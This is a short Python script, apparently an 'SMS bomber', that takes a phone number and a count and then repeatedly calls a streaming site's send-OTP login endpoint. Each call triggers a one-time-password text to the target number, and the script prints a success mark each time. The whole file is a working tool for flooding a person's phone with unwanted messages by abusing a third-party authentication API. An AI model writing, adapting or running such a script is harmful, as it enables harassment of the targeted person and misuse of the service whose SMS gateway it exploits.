color_off="\033[0m"       # Text Reset
purple="\033[0;35m"       # Purple
green="\033[0;32m"        # Green
blue="\033[0;34m"         # Blue

import requests

# GET 
number=str(input(blue+" Enter Your Numder : "+color_off))
amount=int(input(purple+" Enter The Amount : "+color_off))

bioscopeapi="https://www.bioscopelive.com/en/login/send-otp?phone=88"+number+"&operator=bd-otp"

for i in range(amount):
	requests.get(bioscopeapi)
	print(green+str(i+1)+" ★ ✔ SMS Sent ✔ ")